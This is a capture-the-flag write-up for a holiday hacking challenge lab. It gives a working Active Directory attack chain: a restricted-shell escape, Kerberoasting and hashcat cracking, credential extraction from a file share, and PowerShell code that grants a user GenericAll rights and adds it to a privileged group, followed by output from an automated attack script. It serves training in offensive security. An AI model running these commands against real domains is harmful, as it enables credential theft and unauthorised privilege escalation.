<h1 id="objective-8-kerberoasting-on-an-open-fire">Objective 8: Kerberoasting on an Open Fire</h1>
<p><strong>Location: Staging</strong><br>
<strong>Elf: Jingle Ringford</strong><br>
<strong>Hints provided by Eve Snowshoes after completion of <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/HoHo...No.md">HoHo … No</a></strong></p>
<p>The objective to obtain a secret research document.<br>
In order to get an account in the ELFU AD domain, a registration on <a href="https://register.elfu.org">https://register.elfu.org</a> is required.<br>
After that an individual username and password is provided which can be used to logon to <a href="http://grades.elfu.org">grades.elfu.org</a> using SSH on port 2222.</p>
<h3 id="escaping-application">Escaping Application</h3>
<p>After the SSH login an application is automatically started.<br>
It is possible to escape this application by sending an EOF (CTRL-D).</p>
<h3 id="escaping-python-shell">Escaping Python Shell</h3>
<p>After this a Python shell is displayed.<br>
In order to escape this <code>os.system.("bash")</code> has to be submitted in order to get to a normal Unix shell.</p>
<h3 id="reconnaissance">Reconnaissance</h3>
<p>An nmap scan of the network 10.128.0.0/22 two hosts providing Windows services: 10.128.1.53 (domain controller) and 10.128.3.30 (samba file server) with the shares <code>elfu_svc_shr</code> and <code>research_dep</code>.</p>
<h3 id="pulling-data-from-ad">Pulling data from AD</h3>
<p>Next the tool <code>ldapdomaindump</code> can be used in order to get an idea of the user&lt;-&gt;group&lt;-&gt;permission structure:</p>
<pre><code>ldapdomaindump 10.128.1.53 -u 'elfu\{userid}' -p '{password}'
</code></pre>
<p>This can be done manually or using Bloodhound.<br>
Bloodhound also reveals that the user <code>elfu_svc</code> is Kerberoastable.</p>
<p>The password hash for this Kerberoastable user can be obtained by running</p>
<pre><code>GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 'elfu.local/{userid}:{passworð}' -request
</code></pre>
<h3 id="cracking-the-password">Cracking the Password</h3>
<p>We follow the hints and prepare the password cracking as follows:<br>
We prepare a password list using CeWL, keeping in mind that explicitly also digits are valid as per the provided hint:</p>
<pre><code>./cewl.rb https://register.elfu.org/register --with-numbers -w wordlist
</code></pre>
<p>In addition, also following the hint, the OneRuleToRuleThemAll rule for Hashcat is downloaded:</p>
<pre><code>curl -OJ https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
</code></pre>
<p>Equipped with these tool, we can let Hashcat crack the password:</p>
<pre><code>hashcat -m 13100 -a0 spn.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist
</code></pre>
<p>Hashcat find the password for <code>elfu_svc</code> to be <code>Snow2021!</code>.</p>
<h3 id="access-to-elfu_svc_shr">Access to elfu_svc_shr</h3>
<p>With this information we can get access to the elfu_svc_shr file share in 10.128.3.30:</p>
<pre><code>smbclient -U elfu_svc '\\10.128.3.30\elfu_svc_shr'
</code></pre>
<p>On this share are several Powershell scripts. One of them, <code>GetProcessInfo.ps1</code> holds credentials for the <code>user remote_elf</code>:</p>
<pre><code>$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
</code></pre>
<h3 id="getting-into-group-research-department">Getting into group Research Department</h3>
<p>With the <code>remote_elf</code> credential snippet from the script, we can grant our windows domain user the <code>GenericAll</code> permissions for the group Research Department:</p>
<pre><code>Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "{userid}"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
} -Credential $aCred -Authentication Negotiate
</code></pre>
<p>and add then our user to this group:</p>
<pre><code>Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "ptsuxvdegy"
$password = "Scumpfccr#"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
$b=New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID=[BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://&lt;SID=$hexSID&gt;")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()

} -Credential $aCred -Authentication Negotiate
</code></pre>
<h3 id="access-to-research_dep-share">Access to research_dep share</h3>
<p>After a few minutes, our new group membership gets replicated to the samba file server, so that we now have access to the secret document:</p>
<pre><code>smbclient '\\10.128.3.30\research_dep'
smb: \&gt; dir
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Fri Dec 24 08:01:27 2021
  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021

		41089256 blocks of size 1024. 34373492 blocks available

</code></pre>
<p>The <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Objective-8/SantaSecretToAWonderfulHolidaySeason.pdf">PDF document</a> lists <strong>Kindness</strong> as first secret ingredient for a wonderful holiday season.</p>
<h3 id="bonus-kerberoboting">Bonus: Kerberoboting</h3>
<p>This whole process was automated in an <code>expect</code> script named <code>kerberoboting</code>, so that you can enjoy a brew whilst your computer does the work.<br>
It just requires you to register at <a href="https://register.elfu.org">https://register.elfu.org</a>, have <code>hashcat</code> installed in the PATH and a working CeWL in the local directory:</p>
<pre><code>joergen@northpole:~$ ./kerberoboting jsfdgdsjjl 'Ndcopkmbo#'
#
# Kerberoboting in progress - get a brew and lean back
#

Retrieving the wordlist from register.elfu.org using CeWL
Retrieving the OneRuleToRuleThemAll rule for Hashcat
Logging on to grades.elfu.org using SSH
Escaping the application using &lt;EOF&gt;
Escaping the Python shell using os.system('bash')
These shares are available on the file server
smbclient -L '\\\\10.128.3.30'
Enter WORKGROUP\jsfdgdsjjl's password: 

	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      
	sysvol          Disk      
	elfu_svc_shr    Disk      elfu_svc_shr
	research_dep    Disk      research_dep
	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
Running GetUserSPNs.py using my user id to enumerate SPNs linked to user accounts and get their password hashes
Running Hashcat to crack the password
  ok. Password is Snow2021!
Getting access to samba \\\\10.128.3.30\elfu_svc_shr share as user elfu_svc
Obtaining file GetProcessInfo.ps1 which has credentials for remote_elf embedded
Granting myself GenericAll permissions on AD group Research Department and adding myself to it
Getting access to samba \\\\10.128.3.30\research_dep using my user id
dir
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Fri Dec 24 08:01:27 2021
  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021

		41089256 blocks of size 1024. 34373492 blocks available
smb: \\&gt; Getting file SantaSecretToAWonderfulHolidaySeason.pdf
Transferring file SantaSecretToAWonderfulHolidaySeason.pdf to local machine

#
# Have fun and explore more
#

jsfdgdsjjl@grades:~$ 
</code></pre>
<p><strong>Achievement: Kerberoasting on an Open Fire</strong></p>

